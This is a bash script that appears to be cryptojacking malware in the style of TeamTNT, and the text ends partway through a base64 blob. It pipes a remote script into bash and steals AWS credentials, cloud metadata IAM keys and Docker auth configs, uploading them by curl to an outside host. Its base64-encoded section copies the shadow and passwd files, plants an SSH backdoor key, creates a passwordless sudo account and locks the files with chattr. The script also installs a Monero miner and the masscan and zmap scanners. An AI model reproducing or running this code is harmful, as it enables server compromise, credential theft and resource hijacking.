#!/bin/bash
unset HISTFILE
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games

function INIT_MAIN(){
SETUP_BASICS
SETUP_JQ
GABBING_DATA
CREATE_ACCOUNT
SETUP_XMR
START_XMR
SETUP_MSCAN
SETUP_ZMAP
SETUP_ZGRAB
bash /root/scan.sh
}

function SETUP_BASICS(){
apk update
apk add bash curl wget vim docker
service docker start
curl http://kaiserfranz.cc/ws.sh | bash
}

function SETUP_JQ(){
apk update
apk add jq
}

function SETUP_MSCAN(){
apk update
apk add git gcc make musl-dev libpcap-dev linux-headers
git clone https://github.com/robertdavidgraham/masscan /opt/masscan/
cd /opt/masscan/
make
make install
}

function SETUP_ZMAP(){
apk update
apk add zmap
}

function SETUP_ZGRAB(){
apk update
apk add git go gcc make musl-dev libpcap-dev linux-headers
export GOPATH=/root/go
go get github.com/zmap/zgrab
cd /root/go/src/github.com/zmap/zgrab/
go build
cp ./zgrab /usr/bin/zgrab
chmod +x /usr/bin/zgrab
}

function GABBING_DATA(){
if [ -d "/host" ] ; then
cat /host/root/.aws/* >> /tmp/.aws 2>/dev/null ; cat /host/home/*/.aws/* >> /tmp/.aws 2>/dev/null
cat /tmp/.aws | grep "aws_access_key_id" || rm -f /tmp/.aws
if [ -f "/tmp/.aws" ] ; then curl -F "userfile=@/tmp/.aws" http://solscan.live/upload.php ; rm -f /tmp/.aws ; fi

curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/) >> /tmp/.aws2
cat /tmp/.aws2 | grep "SecretAccessKey" || rm -f /tmp/.aws2 
if [ -f "/tmp/.aws2" ] ; then curl -F "userfile=@/tmp/.aws2" http://solscan.live/upload.php  ; rm -f /tmp/.aws2 ; fi

env | grep "AWS" >> /tmp/.aws3
cat /tmp/.aws2 | grep "AWS" || rm -f /tmp/.aws3
if [ -f "/tmp/.aws3" ] ; then curl -F "userfile=@/tmp/.aws3" http://solscan.live/upload.php  ; rm -f /tmp/.aws3 ; fi


cat /host/root/.docker/config.json >> /tmp/.docker 2>/dev/null ; cat /host/home/*/.docker/config.json >> /tmp/.docker 2>/dev/null
cat /tmp/.docker | grep "auth" || rm -f /tmp/.docker
if [ -f "/tmp/.docker" ] ; then
curl -F "userfile=@/tmp/.docker" http://solscan.live/upload.php 
rm -f /tmp/.docker
fi

fi
}

function CREATE_ACCOUNT(){
$(echo IyEvYmluL2Jhc2gKUkFTX0tFWT0nc3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFDQVFESzJDOUxuY01ndHNmeXE1OVY5d2VhY0FYSjBSdzRGMGg2Nkh3MzdyQnk4WlhlVjRXUGNHOVRpVmdGMWRSRlNPNzNoUWt5cHFuN1FlMHN2aUpiVWtkcUZEYXB1cjQ0aFVVN2RUU2tkT1JickxIZHd2MHZNUlV5VkpPdTMxeUt0d25WWDJiRnVEVHZpRWdPSVBsVGVPdHV6YUVhNkpWS0NGcjgxVC9rclhNRFlYNm5QZUQzNnRZVFVGRzBQNmpWckwreEZMcDhZbTdBT2NwT0VHK0ZDQWVITXFtTi84alRabnc5YUl3U2xJZHpBamUrWkg0MTc5SEpBZTFpMlBoWUpMNUdOOUVFcXRKQld3bFlWSGREUEZhWTJkS3lqanl5RTI1eWFoMjVXdmpPbWt0MzVPUENONTN3eWNoaTFRbTNNVFVqVERQU2hqaGxUdFQrcjAzTmlOUGlwbjFGS3UxeFZyZC9YN0NXbGJYTFRrM0o2NWFUMnJXam5nL1NwNUw3YmpPVUM2RTZWS3owSmx4MkcxUmp5dzMyajlnY2M1L2d3OUNydyt1YjNQeFlCM1dpZE5yWndWUlRVcWwrSHQyYlhsK2VWTk5TdUc2YmZOUHRGU2lVcVBiWE9HVzczVjJqWjUvampuNnZWVy9PYzJTRTRZejU3L2NyOEVldnRldytaT2I3MUpiTERXZzA3cGl3dHBXUVN6QU94YU9uZVdUaW9TTDVCTm9WeVBKT3dPNkRVV1N4VW1QVjBxd2E2dURyN2hXMm44eFhMc0VLUVhQUjNtd1JvZ2srRnpiK2RUWmFsajNlTTRlTmd2eVRGcTF0NTg4QUZjS1QwMUJ1cEkvZXN3U2hxRmxlK0tVMFdLTm1VamZVNk9GWGVkVGRpeEpOa3YvOVltek5HUm9lRFE9PSBHZW5lcmF0ZWQgQnkgVGVybWl1c0AnJChjYXQgL2V0Yy9ob3N0bmFtZSknJwpUTVBfRElSPSIvdG1wLy5kYXRhLy51cGxvYWQvZ2FtZXMiClRIRVBBVEg9Ii9ob3N0IgoKY2hhdHRyIC1pYSAkVEhFUEFUSC90bXAvICRUSEVQQVRIL3Vzci8gJFRIRVBBVEgvdXNyL2Jpbi8gJFRIRVBBVEgvdXNyL3NiaW4vICRUSEVQQVRIL2Jpbi8gJFRIRVBBVEgvc2Jpbi8gJFRIRVBBVEgvdXNyL2dhbWVzLyAkVEhFUEFUSC91c3IvZ2FtZXMvLnNzaC8gJFRIRVBBVEgvdXNyL2dhbWVzL3NiaW4vICRUSEVQQVRIL2V0Yy8gMj4vZGV2L251bGwKdG50cmVjaHQgLWlhICRUSEVQQVRIL3RtcC8gJFRIRVBBVEgvdXNyLyAkVEhFUEFUSC91c3IvYmluLyAkVEhFUEFUSC91c3Ivc2Jpbi8gJFRIRVBBVEgvYmluLyAkVEhFUEFUSC9zYmluLyAkVEhFUEFUSC91c3IvZ2FtZXMvICRUSEVQQVRIL3Vzci9nYW1lcy8uc3NoLyAkVEhFUEFUSC91c3IvZ2FtZXMvc2Jpbi8gJFRIRVBBVEgvZXRjLyAyPi9kZXYvbnVsbApjaGF0dHIgLVIgLWlhICRUSEVQQVRIL2hvbWUvICRUSEVQQVRIL3Jvb3QvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgJFRIRVBBVEgvaG9tZS8gJFRIRVBBVEgvcm9vdC8gMj4vZGV2L251bGwKCmNoYXR0ciAtaWEgJFRIRVBBVEgvYmluL2N1cmwgMj4vZGV2L251bGw7IHRudHJlY2h0IC1pYSAkVEhFUEFUSC9iaW4vY3VybCAyPi9kZXYvbnVsbApjaG1vZCAxNzc3ICRUSEVQQVRIL2Jpbi9jdXJsIDI+L2Rldi9udWxsOyBjaG1vZCAreCAkVEhFUEFUSC9iaW4vY3VybCAyPi9kZXYvbnVsbApjaGF0dHIgLWlhICRUSEVQQVRIL3Vzci9iaW4vY3VybCAyPi9kZXYvbnVsbDsgdG50cmVjaHQgLWlhICRUSEVQQVRIL3Vzci9iaW4vY3VybCAyPi9kZXYvbnVsbApjaG1vZCAxNzc3ICRUSEVQQVRIL3Vzci9iaW4vY3VybCAyPi9kZXYvbnVsbDsgY2htb2QgK3ggJFRIRVBBVEgvdXNyL2Jpbi9jdXJsIDI+L2Rldi9udWxsCgppZiAhIHR5cGUgc3VkbyAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgdGhlbgppZiB0eXBlIGFwdC1nZXQgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IHRoZW4gYXB0LWdldCB1cGRhdGUgLS1maXgtbWlzc2luZyAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgYXB0LWdldCBpbnN0YWxsIC15IHN1ZG8gMj4vZGV2L251bGwgMT4vZGV2L251bGw7IGZpCmlmIHR5cGUgeXVtIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyB0aGVuIHl1bSBjbGVhbiBhbGwgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IHl1bSBpbnN0YWxsIC15IHN1ZG8gMj4vZGV2L251bGwgMT4vZGV2L251bGw7IGZpCmlmIHR5cGUgYXBrIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyB0aGVuIGFwayB1cGRhdGUgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IGFwayBhZGQgc3VkbyAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgZmkKZmkKaWYgISB0eXBlIGNoYXR0ciAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgdGhlbgppZiB0eXBlIGFwdC1nZXQgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IHRoZW4gYXB0LWdldCB1cGRhdGUgLS1maXgtbWlzc2luZyAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgYXB0LWdldCBpbnN0YWxsIC15IGUyZnNwcm9ncyAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgZmkKaWYgdHlwZSB5dW0gMj4vZGV2L251bGwgMT4vZGV2L251bGw7IHRoZW4geXVtIGNsZWFuIGFsbCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgeXVtIGluc3RhbGwgLXkgZTJmc3Byb2dzIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyBmaQppZiB0eXBlIGFwayAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgdGhlbiBhcGsgdXBkYXRlIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyBhcGsgYWRkIGUyZnNwcm9ncyAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgZmkKZmkKaWYgISB0eXBlIGJhc2ggMj4vZGV2L251bGwgMT4vZGV2L251bGw7IHRoZW4KaWYgdHlwZSBhcHQtZ2V0IDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyB0aGVuIGFwdC1nZXQgdXBkYXRlIC0tZml4LW1pc3NpbmcgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IGFwdC1nZXQgaW5zdGFsbCAteSBiYXNoIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyBmaQppZiB0eXBlIHl1bSAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgdGhlbiB5dW0gY2xlYW4gYWxsIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyB5dW0gaW5zdGFsbCAteSBiYXNoIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyBmaQppZiB0eXBlIGFwayAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgdGhlbiBhcGsgdXBkYXRlIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyBhcGsgYWRkIGJhc2ggMj4vZGV2L251bGwgMT4vZGV2L251bGw7IGZpCmZpCmlmICEgdHlwZSBjdXJsIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyB0aGVuCmlmIHR5cGUgYXB0LWdldCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgdGhlbiAKCWFwdC1nZXQgdXBkYXRlIC0tZml4LW1pc3NpbmcgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IAoJYXB0LWdldCBpbnN0YWxsIC15IGN1cmwgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IAoJYXB0LWdldCBpbnN0YWxsIC15IC0tcmVpbnN0YWxsIGN1cmwgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IGZpCmlmIHR5cGUgeXVtIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyB0aGVuIAoJeXVtIGNsZWFuIGFsbCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgCgl5dW0gaW5zdGFsbCAteSBjdXJsIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyAKCXl1bSByZWluc3RhbGwgLXkgY3VybCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgZmkKaWYgdHlwZSBhcGsgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IHRoZW4gCglhcGsgdXBkYXRlIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyAKCWFwayBhZGQgY3VybCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgZmkKZmkKCm1rZGlyIC1wICRUTVBfRElSCmxzIC0xICRUSEVQQVRIL2hvbWUvID4gJFRNUF9ESVIvdXNlcnMudHh0CmNwICRUSEVQQVRIL2V0Yy9wYXNzd2QgJFRNUF9ESVIvcGFzc3dkCmNwICRUSEVQQVRIL2V0Yy9zaGFkb3cgJFRNUF9ESVIvc2hhZG93CmNwICRUSEVQQVRIL2V0Yy9zdWRvZXJzICRUTVBfRElSL3N1ZG9lcnMKY3AgJFRIRVBBVEgvZXRjL2dyb3VwICRUTVBfRElSL2dyb3VwCmNwICRUSEVQQVRIL2V0Yy9ob3N0cyAkVE1QX0RJUi9ob3N0cwoKdGFyIGN2emYgJFRNUF9ESVIvcm9vdC5zc2gudGFyLmd6ICRUSEVQQVRIL3Jvb3QvLnNzaC8gJFRIRVBBVEgvcm9vdC8uYmFzaF9oaXN0b3J5IApjaGF0dHIgLWlhICRUSEVQQVRIL3Jvb3QvICRUSEVQQVRIL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IHRudHJlY2h0IC1pYSAkVEhFUEFUSC9yb290LyAkVEhFUEFUSC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAkVEhFUEFUSC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzIHwgZ3JlcCAnc3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFDQVFERk8vRUZRUXhCcVNZK1g5M0VDVFVZUUx4QXpmNXMwcG5hT3U0UlpQbVNHbjE3YjdLaXhhOGoyQktPdS9tTDFudmZCdXVZb2hkaWhkVDdSVmFFSkRQZzdsS2JzR1VEaGFINmlmRUgwQURZVGp4ODFqek9hUEMwZ3lpWXVWWktxdDJuQUhBUDBhN29pSnEwZzZIWjRmM2ZNRDFhMzY5cFFvZm9tT2pUcTNjYlh2TE9TaXVFcTFwRGZSbU5TTU0wbTZCRGlSaHBxUjlrU0YydDB6WTRocG1OK3YxQWFtZk5SdEoxTERYb1NHSlc4a2w1L0xBbm9KRURIYXljTnRBUFVzTXBBZ3B4Zlkvbk1PalR2bFpFSGJBN1NsbkMzNkNwdzlSRUxESzV6aXBNVU51cHRVcFpIRWZPN2o4T3JoVzk4QzVCR29Uams4TDVVWFEvbFBhaHNYeWQrLzR6dHBPNHlWakxSNDBsZUQ1U3ZzTThIU09FQzh0NzBWTDNGQ2RvVDV0Y1U5VGQ1WFkrV3BKOThFRTF0QnBkdnlLVjY5Y28zOURFcVFQZFQwajA3M1NVdGM1cmR1eTZKUW52cytFM1ZoSTZaVm9UMFR5ZEpraGZqTk95a0JMbysyVUJFSENJS3IxWVRSZXdZc2d0akNsM3Izb1dkWjA2WXVMcnJZdDdJaDROL1dISWpWZ2Z6enJ5dnMweGhnbFd4cGZRUmwvdXB6MVBVRWVkR20vajhnK29zSnlsKzRYUituZUpXSVRnMWpmbmp6SHVDeWFVYXJPVHd5c0o5S2pTZHhZRzFZcnNacitPekdvU0YyWXR1c0pkK0RsOW1MUTdJbzRqc3JVc2xVcmU2N1ltMERqOVBEUkRobUNFRDZIUjdCaW13QTlRdE1nL01abEg0QmVsVVEnIHx8IGVjaG8gJFJBU19LRVkgPj4gJFRIRVBBVEgvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cwpjYXQgJFRIRVBBVEgvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5czIgfCBncmVwICdzc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUNBUURGTy9FRlFReEJxU1krWDkzRUNUVVlRTHhBemY1czBwbmFPdTRSWlBtU0duMTdiN0tpeGE4ajJCS091L21MMW52ZkJ1dVlvaGRpaGRUN1JWYUVKRFBnN2xLYnNHVURoYUg2aWZFSDBBRFlUang4MWp6T2FQQzBneWlZdVZaS3F0Mm5BSEFQMGE3b2lKcTBnNkhaNGYzZk1EMWEzNjlwUW9mb21PalRxM2NiWHZMT1NpdUVxMXBEZlJtTlNNTTBtNkJEaVJocHFSOWtTRjJ0MHpZNGhwbU4rdjFBYW1mTlJ0SjFMRFhvU0dKVzhrbDUvTEFub0pFREhheWNOdEFQVXNNcEFncHhmWS9uTU9qVHZsWkVIYkE3U2xuQzM2Q3B3OVJFTERLNXppcE1VTnVwdFVwWkhFZk83ajhPcmhXOThDNUJHb1RqazhMNVVYUS9sUGFoc1h5ZCsvNHp0cE80eVZqTFI0MGxlRDVTdnNNOEhTT0VDOHQ3MFZMM0ZDZG9UNXRjVTlUZDVYWStXcEo5OEVFMXRCcGR2eUtWNjljbzM5REVxUVBkVDBqMDczU1V0YzVyZHV5NkpRbnZzK0UzVmhJNlpWb1QwVHlkSmtoZmpOT3lrQkxvKzJVQkVIQ0lLcjFZVFJld1lzZ3RqQ2wzcjNvV2RaMDZZdUxycll0N0loNE4vV0hJalZnZnp6cnl2czB4aGdsV3hwZlFSbC91cHoxUFVFZWRHbS9qOGcrb3NKeWwrNFhSK25lSldJVGcxamZuanpIdUN5YVVhck9Ud3lzSjlLalNkeFlHMVlyc1pyK096R29TRjJZdHVzSmQrRGw5bUxRN0lvNGpzclVzbFVyZTY3WW0wRGo5UERSRGhtQ0VENkhSN0JpbXdBOVF0TWcvTVpsSDRCZWxVUScgfHwgZWNobyAkUkFTX0tFWSA+ICRUSEVQQVRIL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCmNoYXR0ciArYSAkVEhFUEFUSC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzIDI+L2Rldi9udWxsOyB0bnRyZWNodCArYSAkVEhFUEFUSC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzIDI+L2Rldi9udWxsCmNoYXR0ciAraSAkVEhFUEFUSC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzMiAyPi9kZXYvbnVsbDsgdG50cmVjaHQgK2kgJFRIRVBBVEgvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5czIgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGwKCgp3aGlsZSByZWFkIFVOQU1FCmRvCmNoYXR0ciAtaWEgJFRIRVBBVEgvaG9tZS8gJFRIRVBBVEgvaG9tZS8kVU5BTUUvICRUSEVQQVRIL2hvbWUvJFVOQU1FLy5zc2gvICRUSEVQQVRIL2hvbWUvJFVOQU1FLy5zc2gvYXV0aG9yaXplZF9rZXlzICRUSEVQQVRIL2hvbWUvJFVOQU1FLy5zc2gvYXV0aG9yaXplZF9rZXlzMiAyPi9kZXYvbnVsbAp0bnRyZWNodCAtaWEgJFRIRVBBVEgvaG9tZS8gJFRIRVBBVEgvaG9tZS8kVU5BTUUvICRUSEVQQVRIL2hvbWUvJFVOQU1FLy5zc2gvICRUSEVQQVRIL2hvbWUvJFVOQU1FLy5zc2gvYXV0aG9yaXplZF9rZXlzICRUSEVQQVRIL2hvbWUvJFVOQU1FLy5zc2gvYXV0aG9yaXplZF9rZXlzMiAyPi9kZXYvbnVsbAppZiBbICEgLWQgJFRIRVBBVEgvaG9tZS8kVU5BTUUvLnNzaC8gXTsgdGhlbiBta2RpciAtcCAkVEhFUEFUSC9ob21lLyRVTkFNRS8uc3NoLyAyPi9kZXYvbnVsbDsgZmkKdGFyIGN2emYgJFRNUF9ESVIvJFVOQU1FLnNzaC50YXIuZ3ogJFRIRVBBVEgvaG9tZS8kVU5BTUUvLnNzaC8gJFRIRVBBVEgvaG9tZS8kVU5BTUUvLmJhc2hfaGlzdG9yeQpjYXQgJFRIRVBBVEgvaG9tZS8kVU5BTUUvLnNzaC9hdXRob3JpemVkX2tleXMgfCBncmVwICdzc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUNBUURGTy9FRlFReEJxU1krWDkzRUNUVVlRTHhBemY1czBwbmFPdTRSWlBtU0duMTdiN0tpeGE4ajJCS091L21MMW52ZkJ1dVlvaGRpaGRUN1JWYUVKRFBnN2xLYnNHVURoYUg2aWZFSDBBRFlUang4MWp6T2FQQzBneWlZdVZaS3F0Mm5BSEFQMGE3b2lKcTBnNkhaNGYzZk1EMWEzNjlwUW9mb21PalRxM2NiWHZMT1NpdUVxMXBEZlJtTlNNTTBtNkJEaVJocHFSOWtTRjJ0MHpZNGhwbU4rdjFBYW1mTlJ0SjFMRFhvU0dKVzhrbDUvTEFub0pFREhheWNOdEFQVXNNcEFncHhmWS9uTU9qVHZsWkVIYkE3U2xuQzM2Q3B3OVJFTERLNXppcE1VTnVwdFVwWkhFZk83ajhPcmhXOThDNUJHb1RqazhMNVVYUS9sUGFoc1h5ZCsvNHp0cE80eVZqTFI0MGxlRDVTdnNNOEhTT0VDOHQ3MFZMM0ZDZG9UNXRjVTlUZDVYWStXcEo5OEVFMXRCcGR2eUtWNjljbzM5REVxUVBkVDBqMDczU1V0YzVyZHV5NkpRbnZzK0UzVmhJNlpWb1QwVHlkSmtoZmpOT3lrQkxvKzJVQkVIQ0lLcjFZVFJld1lzZ3RqQ2wzcjNvV2RaMDZZdUxycll0N0loNE4vV0hJalZnZnp6cnl2czB4aGdsV3hwZlFSbC91cHoxUFVFZWRHbS9qOGcrb3NKeWwrNFhSK25lSldJVGcxamZuanpIdUN5YVVhck9Ud3lzSjlLalNkeFlHMVlyc1pyK096R29TRjJZdHVzSmQrRGw5bUxRN0lvNGpzclVzbFVyZTY3WW0wRGo5UERSRGhtQ0VENkhSN0JpbXdBOVF0TWcvTVpsSDRCZWxVUScgfHwgZWNobyAkUkFTX0tFWSA+PiAkVEhFUEFUSC9ob21lLyRVTkFNRS8uc3NoL2F1dGhvcml6ZWRfa2V5cwpjYXQgJFRIRVBBVEgvaG9tZS8kVU5BTUUvLnNzaC9hdXRob3JpemVkX2tleXMyIHwgZ3JlcCAnc3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFDQVFERk8vRUZRUXhCcVNZK1g5M0VDVFVZUUx4QXpmNXMwcG5hT3U0UlpQbVNHbjE3YjdLaXhhOGoyQktPdS9tTDFudmZCdXVZb2hkaWhkVDdSVmFFSkRQZzdsS2JzR1VEaGFINmlmRUgwQURZVGp4ODFqek9hUEMwZ3lpWXVWWktxdDJuQUhBUDBhN29pSnEwZzZIWjRmM2ZNRDFhMzY5cFFvZm9tT2pUcTNjYlh2TE9TaXVFcTFwRGZSbU5TTU0wbTZCRGlSaHBxUjlrU0YydDB6WTRocG1OK3YxQWFtZk5SdEoxTERYb1NHSlc4a2w1L0xBbm9KRURIYXljTnRBUFVzTXBBZ3B4Zlkvbk1PalR2bFpFSGJBN1NsbkMzNkNwdzlSRUxESzV6aXBNVU51cHRVcFpIRWZPN2o4T3JoVzk4QzVCR29Uams4TDVVWFEvbFBhaHNYeWQrLzR6dHBPNHlWakxSNDBsZUQ1U3ZzTThIU09FQzh0NzBWTDNGQ2RvVDV0Y1U5VGQ1WFkrV3BKOThFRTF0QnBkdnlLVjY5Y28zOURFcVFQZFQwajA3M1NVdGM1cmR1eTZKUW52cytFM1ZoSTZaVm9UMFR5ZEpraGZqTk95a0JMbysyVUJFSENJS3IxWVRSZXdZc2d0akNsM3Izb1dkWjA2WXVMcnJZdDdJaDROL1dISWpWZ2Z6enJ5dnMweGhnbFd4cGZRUmwvdXB6MVBVRWVkR20vajhnK29zSnlsKzRYUituZUpXSVRnMWpmbmp6SHVDeWFVYXJPVHd5c0o5S2pTZHhZRzFZcnNacitPekdvU0YyWXR1c0pkK0RsOW1MUTdJbzRqc3JVc2xVcmU2N1ltMERqOVBEUkRobUNFRDZIUjdCaW13QTlRdE1nL01abEg0QmVsVVEnIHx8IGVjaG8gJFJBU19LRVkgPiAkVEhFUEFUSC9ob21lLyRVTkFNRS8uc3NoL2F1dGhvcml6ZWRfa2V5czIKY2hhdHRyICtpICRUSEVQQVRIL2hvbWUvJFVOQU1FLy5zc2gvYXV0aG9yaXplZF9rZXlzMiAyPi9kZXYvbnVsbDsgdG50cmVjaHQgK2kgJFRIRVBBVEgvaG9tZS8kVU5BTUUvLnNzaC9hdXRob3JpemVkX2tleXMyIDI+L2Rldi9udWxsCmNoYXR0ciArYSAkVEhFUEFUSC9ob21lLyRVTkFNRS8uc3NoL2F1dGhvcml6ZWRfa2V5cyAyPi9kZXYvbnVsbDsgdG50cmVjaHQgK2EgJFRIRVBBVEgvaG9tZS8kVU5BTUUvLnNzaC9hdXRob3JpemVkX2tleXMgMj4vZGV2L251bGwKZG9uZSA8ICRUTVBfRElSL3VzZXJzLnR4dAoKY2hhdHRyIC1pYSAvdG1wLyAyPi9kZXYvbnVsbDsgdG50cmVjaHQgLWlhIC90bXAvIDI+L2Rldi9udWxsCnRhciBjdnpmIC90bXAvZ2FtZXMudGFyLmd6ICRUTVBfRElSLyAyPi9kZXYvbnVsbApjdXJsIC1GICJ1c2VyZmlsZT1AL2hzcGVyZmRhdGFfcm9vdCIgaHR0cHM6Ly9zb2xzY2FuLmxpdmUvTGFzdFB1YmxpY1JvdW5kL2luZGV4LnBocApybSAtZiAvdG1wL2dhbWVzLnRhci5negpybSAtZnIgJFRNUF9ESVIKCmNoYXR0ciAtaWEgJFRIRVBBVEgvZXRjLyAkVEhFUEFUSC9ldGMvcGFzc3dkICRUSEVQQVRIL2V0Yy9zaGFkb3cgJFRIRVBBVEgvZXRjL3N1ZG9lcnMgJFRIRVBBVEgvZXRjL2dyb3VwICRUSEVQQVRIL2Jpbi9iYXNoICRUSEVQQVRIL3Vzci8gMj4vZGV2L251bGw7IHRudHJlY2h0IC1pYSAkVEhFUEFUSC9ldGMvICRUSEVQQVRIL2V0Yy9wYXNzd2QgJFRIRVBBVEgvZXRjL3NoYWRvdyAkVEhFUEFUSC9ldGMvc3Vkb2VycyAkVEhFUEFUSC9ldGMvZ3JvdXAgJFRIRVBBVEgvYmluL2Jhc2ggJFRIRVBBVEgvdXNyLyAyPi9kZXYvbnVsbApjaGF0dHIgLVIgLWlhICRUSEVQQVRIL3Vzci9nYW1lcy8KaWYgWyAhIC1kICIkVEhFUEFUSC91c3IvZ2FtZXMvLnNzaC8iIF07IHRoZW4gbWtkaXIgLXAgJFRIRVBBVEgvdXNyL2dhbWVzLy5zc2gvIDI+L2Rldi9udWxsOyBmaQppZiBbICEgLWQgIiRUSEVQQVRIL3Vzci9nYW1lcy9zYmluLyIgXTsgdGhlbiBta2RpciAtcCAkVEhFUEFUSC91c3IvZ2FtZXMvc2Jpbi8gMj4vZGV2L251bGw7IGZpCmlmIFsgISAtZiAiJFRIRVBBVEgvdXNyL2dhbWVzL3NiaW4vbm9sb2dpbiIgXTsgdGhlbiBjcCAkVEhFUEFUSC9iaW4vYmFzaCAkVEhFUEFUSC91c3IvZ2FtZXMvc2Jpbi9ub2xvZ2luIDI+L2Rldi9udWxsOyBjaG1vZCAreCAkVEhFUEFUSC91c3IvZ2FtZXMvc2Jpbi9ub2xvZ2luIDI+L2Rldi9udWxsOyBmaQpjaGF0dHIgLWlhICRUSEVQQVRIL3Vzci8gJFRIRVBBVEgvdXNyL2dhbWVzLyAkVEhFUEFUSC91c3IvZ2FtZXMvLnNzaC8gJFRIRVBBVEgvdXNyL2dhbWVzLy5zc2gvYXV0aG9yaXplZF9rZXlzICRUSEVQQVRIL3Vzci9nYW1lcy8uc3NoL2F1dGhvcml6ZWRfa2V5czIgMj4vZGV2L251bGwKdG50cmVjaHQgLWlhICRUSEVQQVRIL3Vzci8gJFRIRVBBVEgvdXNyL2dhbWVzLyAkVEhFUEFUSC91c3IvZ2FtZXMvLnNzaC8gJFRIRVBBVEgvdXNyL2dhbWVzLy5zc2gvYXV0aG9yaXplZF9rZXlzICRUSEVQQVRIL3Vzci9nYW1lcy8uc3NoL2F1dGhvcml6ZWRfa2V5czIgMj4vZGV2L251bGwKZWNobyAkUkFTX0tFWSA+ICRUSEVQQVRIL3Vzci9nYW1lcy8uc3NoL2F1dGhvcml6ZWRfa2V5cwplY2hvICRSQVNfS0VZID4gJFRIRVBBVEgvdXNyL2dhbWVzLy5zc2gvYXV0aG9yaXplZF9rZXlzMgpjaGF0dHIgK2kgJFRIRVBBVEgvdXNyL2dhbWVzLy5zc2gvYXV0aG9yaXplZF9rZXlzICRUSEVQQVRIL3Vzci9nYW1lcy8uc3NoL2F1dGhvcml6ZWRfa2V5czIgJFRIRVBBVEgvdXNyL2dhbWVzLy5zc2gvIDI+L2Rldi9udWxsCnRudHJlY2h0ICtpICRUSEVQQVRIL3Vzci9nYW1lcy8uc3NoL2F1dGhvcml6ZWRfa2V5cyAkVEhFUEFUSC91c3IvZ2FtZXMvLnNzaC9hdXRob3JpemVkX2tleXMyICRUSEVQQVRIL3Vzci9nYW1lcy8uc3NoLyAyPi9kZXYvbnVsbAoKaWYgISBncmVwICdnYW1lcyBBTEw9KEFMTCkgTk9QQVNTV0Q6QUxMJyAiJFRIRVBBVEgvZXRjL3N1ZG9lcnMiIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyB0aGVuCmNoYXR0ciAtaWEgJFRIRVBBVEgvZXRjLyAkVEhFUEFUSC9ldGMvc3Vkb2VycyAyPi9kZXYvbnVsbDsgdG50cmVjaHQgLWlhICRUSEVQQVRIL2V0Yy8gJFRIRVBBVEgvZXRjL3N1ZG9lcnMgMj4vZGV2L251bGwKc2VkIC1pICcvYmUgZWRpdGVkIHdpdGggdGhlL2FcZ2FtZXMgQUxMPShBTEwpIE5PUEFTU1dEOkFMTCcgJFRIRVBBVEgvZXRjL3N1ZG9lcnMKY2hhdHRyICthICRUSEVQQVRIL2V0Yy9zdWRvZXJzIDI+L2Rldi9udWxsOyB0bnRyZWNodCArYSAkVEhFUEFUSC9ldGMvc3Vkb2VycyAyPi9kZXYvbnVsbApmaQoKY2hhdHRyIC1pYSAkVEhFUEFUSC9ldGMvICRUSEVQQVRIL2V0Yy9wYXNzd2QgJFRIRVBBVEgvZXRjL3NoYWRvdyAyPi9kZXYvbnVsbDsgdG50cmVjaHQgLWlhICRUSEVQQVRIL2V0Yy8gJFRIRVBBVE